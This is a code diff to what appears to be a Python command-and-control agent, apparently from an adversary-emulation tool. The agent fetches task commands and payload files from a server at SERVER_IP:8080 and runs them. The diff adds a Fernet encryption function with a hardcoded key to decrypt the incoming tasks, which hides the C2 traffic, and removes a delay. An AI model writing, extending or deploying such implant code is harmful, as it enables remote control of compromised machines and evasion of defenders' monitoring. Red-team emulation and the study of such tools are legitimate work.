@@ -9,6 +9,7 @@ import time
 import urllib3
 from random import randrange
 from pathlib import Path
+from cryptography.fernet import Fernet
 
 from urllib3.exceptions import MaxRetryError
 
@@ -161,7 +162,7 @@ def download_and_run_commands():
         url = 'http://{0}:8080/agent_tasks/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
-
+        response = symmetric_cipher(response, encrypt=False)
         if req.status == 200:
             results = []
             agent_commands = response.split('++')
@@ -235,8 +236,6 @@ def send_output():
             if req.status == 200:
                 print('[+] Agent executed T%s' % agent_tech[i])
 
-            # time.sleep(4)
-
         except IndexError:
             pass
         except MaxRetryError:
@@ -301,6 +300,23 @@ def download(file_path):
     payload = file_path.split("/")[-1]
     with open(payload, "wb") as file_download:
         file_download.write(req.data)
+
+
+def symmetric_cipher(text, encrypt=True):
+    """
+    Encrypts or Decrypts a string using AES symmetric cipher.
+    :param text:
+    :param encrypt:
+    :return: cipher or plaintext string
+    """
+    cipher_key = b'2ITm7dWcIz5BcGWVsyovqh8PHkIGKZaXWV1nr5AT834='
+    f = Fernet(cipher_key)
+    if encrypt:
+        cipher_text = f.encrypt(text.encode('utf-8'))
+        return cipher_text.decode('utf-8')
+    else:
+        plaint_text = f.decrypt(text.encode('utf-8'))
+        return plaint_text.decode('utf-8')
 
 
 if __name__ == '__main__':
